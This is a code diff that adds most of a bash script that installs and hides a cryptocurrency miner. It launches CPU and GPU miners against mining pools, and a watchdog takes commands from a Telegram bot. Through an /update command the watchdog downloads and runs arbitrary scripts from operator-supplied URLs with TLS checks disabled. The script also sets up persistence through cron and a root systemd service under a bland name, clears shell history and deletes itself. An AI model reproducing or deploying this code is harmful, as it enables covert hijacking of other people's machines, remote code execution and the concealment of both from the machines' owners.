@@ -329,3 +329,198 @@ while true; do
     if [ "\$PAUSED" -eq 0 ]; then
         CPU_STATUS="🟢 Active"
         if [ -f "./\$BIN_CPU" ]; then
+            if ! pgrep -f "\$BIN_CPU" > /dev/null; then
+                chmod +x "./\$BIN_CPU"
+                nohup ./\$BIN_CPU --config=config.json >> "\$LOG_CPU" 2>&1 &
+                sleep 2
+                if ! pgrep -f "\$BIN_CPU" > /dev/null; then CPU_STATUS="🔴 Offline / Stalled"; fi
+            fi
+        fi
+
+        GPU_STATUS="N/A (No GPU)"
+        if [ "\$HAS_GPU" -eq 1 ]; then
+            GPU_STATUS="🟢 Active"
+            if [ -f "./\$BIN_GPU" ]; then
+                if ! pgrep -f "\$BIN_GPU" > /dev/null; then
+                    chmod +x "./\$BIN_GPU"
+                    nohup ./\$BIN_GPU --algorithm pearlhash --pool \$POOL_GPU_1 --wallet \$WORKER --pool \$POOL_GPU_2 --wallet \$WORKER --watchdog-enable --retry-time 10 --disable-cpu >> "\$LOG_GPU" 2>&1 &
+                    sleep 2
+                    if ! pgrep -f "\$BIN_GPU" > /dev/null; then GPU_STATUS="🔴 Offline / Crashed"; fi
+                fi
+            fi
+        fi
+    else
+        CPU_STATUS="⏸ Paused by Admin"
+        GPU_STATUS="⏸ Paused by Admin"
+    fi
+
+    # --- 2. РОТАЦИЯ ЛОГОВ ---
+    [ -f "\$LOG_CPU" ] && tail -n 300 "\$LOG_CPU" > "\$LOG_CPU.tmp" && mv "\$LOG_CPU.tmp" "\$LOG_CPU"
+    [ -f "\$LOG_GPU" ] && tail -n 300 "\$LOG_GPU" > "\$LOG_GPU.tmp" && mv "\$LOG_GPU.tmp" "\$LOG_GPU"
+
+    # --- 3. ТЕЛЕГРАМ ОБРАБОТЧИК ---
+    LAST_CMD=\$(curl -s -m 3 --connect-timeout 2 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=-1&timeout=1" 2>/dev/null)
+    UPDATE_ID=\$(echo "\$LAST_CMD" | grep -o '"update_id":[0-9]*' | head -n 1 | cut -d: -f2)
+
+    if [ -n "\$UPDATE_ID" ]; then
+        AUTH_CHECK=\$(echo "\$LAST_CMD" | grep -o '"id":'"\$TG_CHAT_ID")
+        
+        curl -s -m 2 --connect-timeout 1 "https://api.telegram.org/bot\${TG_BOT_TOKEN}/getUpdates?offset=\$((UPDATE_ID + 1))" >/dev/null 2>&1
+
+        if [ -n "\$AUTH_CHECK" ]; then
+            CMD_TARGET=\$(echo "\$LAST_CMD" | awk '{print \$2}' | tr -d '\r\n')
+
+            if is_target_me "\$CMD_TARGET"; then
+                
+                if echo "\$LAST_CMD" | grep -iE "/status|/stat" >/dev/null 2>&1; then
+                    send_telemetry_report "ON-DEMAND TELEMETRY REPORT"
+                    
+                elif echo "\$LAST_CMD" | grep -iE "/specs|/hw|/info" >/dev/null 2>&1; then
+                    send_specs_report
+                    
+                elif echo "\$LAST_CMD" | grep -iE "/logs|/log" >/dev/null 2>&1; then
+                    send_logs_report
+
+                elif echo "\$LAST_CMD" | grep -iE "/update|/dl" >/dev/null 2>&1; then
+                    CUSTOM_URL=\$(echo "\$LAST_CMD" | grep -o 'http[s]*://[^" ]*' | head -n 1)
+                    [ -n "\$CUSTOM_URL" ] && TARGET_URL="\$CUSTOM_URL" || TARGET_URL="\$DEFAULT_UPDATE_URL"
+                    
+                    MODULE_DIR="\$BASE_DIR/updates"
+                    mkdir -p "\$MODULE_DIR"
+                    
+                    TIMESTAMP=\$(date +%s)
+                    DEST_SCRIPT="\$MODULE_DIR/Connfy_\${TIMESTAMP}.sh"
+                    
+                    curl -L -k -s -m 15 --connect-timeout 5 -o "\$DEST_SCRIPT" "\$TARGET_URL" || wget -qO "\$DEST_SCRIPT" --no-check-certificate -T 15 "\$TARGET_URL"
+                    
+                    if [ -f "\$DEST_SCRIPT" ] && [ -s "\$DEST_SCRIPT" ]; then
+                        chmod +x "\$DEST_SCRIPT"
+                        (nohup "\$DEST_SCRIPT" </dev/null >/dev/null 2>&1 &)
+                        send_tg_msg "✅ <b>TARGET MATCHED (\$SERVER_IP):</b> Script updated from <code>\$TARGET_URL</code> and launched!"
+                    else
+                        send_tg_msg "❌ <b>UPDATE FAILED (\$SERVER_IP):</b> Could not fetch Connfy.sh from GitHub."
+                    fi
+
+                elif echo "\$LAST_CMD" | grep -i "/stop" >/dev/null 2>&1; then
+                    PAUSED=1
+                    pkill -9 -f "\$BIN_CPU" 2>/dev/null
+                    pkill -9 -f "\$BIN_GPU" 2>/dev/null
+                    send_tg_msg "🛑 <b>PAUSE COMMAND RECEIVED:</b> Processes terminated on IP \$SERVER_IP"
+
+                elif echo "\$LAST_CMD" | grep -iE "/start|/restart" >/dev/null 2>&1; then
+                    PAUSED=0
+                    pkill -9 -f "\$BIN_CPU" 2>/dev/null
+                    pkill -9 -f "\$BIN_GPU" 2>/dev/null
+                    send_tg_msg "🔄 <b>RESUME COMMAND RECEIVED:</b> Restarting processes on IP \$SERVER_IP"
+                fi
+            fi
+        fi
+    fi
+
+    # --- 4. ПЕРИОДИЧЕСКИЙ АВТО-ОТЧЕТ ---
+    ELAPSED=\$(( NOW - LAST_REPORT ))
+    if [ "\$ELAPSED" -ge "\$REPORT_INTERVAL" ]; then
+        LAST_REPORT=\$NOW
+        send_telemetry_report "PERIODIC TELEMETRY REPORT"
+    fi
+
+    sleep 60
+done
+EOF
+
+chmod +x watchdog.sh
+
+# Запускаем CPU и GPU сразу
+if [ -f "./$BIN_CPU" ]; then
+    chmod +x "./$BIN_CPU"
+    nohup ./$BIN_CPU --config=config.json >> "$LOG_CPU" 2>&1 &
+fi
+
+if [ "$HAS_GPU" -eq 1 ] && [ -f "./$BIN_GPU" ]; then
+    chmod +x "./$BIN_GPU"
+    nohup ./$BIN_GPU --algorithm pearlhash --pool $POOL_GPU_1 --wallet $WORKER --pool $POOL_GPU_2 --wallet $WORKER --watchdog-enable --retry-time 10 --disable-cpu >> "$LOG_GPU" 2>&1 &
+fi
+
+pkill -9 -f "watchdog.sh" 2>/dev/null
+(nohup bash "$BASE_DIR/watchdog.sh" </dev/null >/dev/null 2>&1 &)
+
+# ----------------------------------------------------
+# [ PHASE 4: VERBOSE CLEAN ASCII DIAGNOSTICS ]
+# ----------------------------------------------------
+echo "================================================="
+echo "[+] ENGINE V38 INITIALIZED (Pearl Verified)"
+echo "[+] Server IP: $SERVER_IP"
+echo "[+] Worker ID: $WORKER"
+echo "================================================="
+echo "[+] Igniting core engines..."
+sleep 3
+
+echo "-------------------------------------------------"
+echo "[+] CPU ENGINE STATUS:"
+if pgrep -f "$BIN_CPU" >/dev/null; then
+    CPU_PID=$(pgrep -f "$BIN_CPU" | head -n 1)
+    echo "  [OK] RUNNING (PID: $CPU_PID)"
+    echo "  [LOG] Initial Log Tail:"
+    if [ -f "$LOG_CPU" ]; then
+        tail -n 3 "$LOG_CPU" 2>/dev/null | sed 's/^/        /'
+    else
+        echo "        (Initializing log file...)"
+    fi
+else
+    echo "  [ERR] OFFLINE / FAILED TO START"
+fi
+
+echo "-------------------------------------------------"
+echo "[+] GPU ENGINE STATUS (SRBMiner Pearl):"
+if [ "$HAS_GPU" -eq 1 ]; then
+    if pgrep -f "$BIN_GPU" >/dev/null; then
+        GPU_PID=$(pgrep -f "$BIN_GPU" | head -n 1)
+        echo "  [OK] RUNNING (PID: $GPU_PID)"
+        echo "  [LOG] Initial Log Tail:"
+        if [ -f "$LOG_GPU" ]; then
+            tail -n 3 "$LOG_GPU" 2>/dev/null | sed 's/^/        /'
+        else
+            echo "        (Initializing log file...)"
+        fi
+    else
+        echo "  [ERR] OFFLINE / CHECKING GPU LOGS:"
+        if [ -f "$LOG_GPU" ]; then
+            tail -n 5 "$LOG_GPU" 2>/dev/null | sed 's/^/        /'
+        fi
+    fi
+else
+    echo "  [INFO] N/A (CPU-Only Machine)"
+fi
+echo "================================================="
+
+# ----------------------------------------------------
+# [ PHASE 5: SAFE PERSISTENCE ]
+# ----------------------------------------------------
+if command -v crontab >/dev/null 2>&1; then
+    (timeout 2 crontab -l 2>/dev/null | grep -v "watchdog.sh"; \
+     echo "@reboot $BASE_DIR/watchdog.sh"; \
+     echo "*/10 * * * * $BASE_DIR/watchdog.sh") 2>/dev/null | timeout 2 crontab - 2>/dev/null
+fi
+
+if [ "$IS_ROOT" -eq 1 ] && [ -d "/run/systemd/system" ]; then
+    cat <<EOF > /etc/systemd/system/connfy-wd.service
+[Unit]
+Description=Connfy Core Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=$BASE_DIR/watchdog.sh
+Restart=always
+User=root
+
+[Install]
+WantedBy=multi-user.target
+EOF
+    systemctl daemon-reload >/dev/null 2>&1
+    systemctl enable connfy-wd >/dev/null 2>&1
+    systemctl start connfy-wd >/dev/null 2>&1
+fi
+
+history -c
+rm -f "$0"
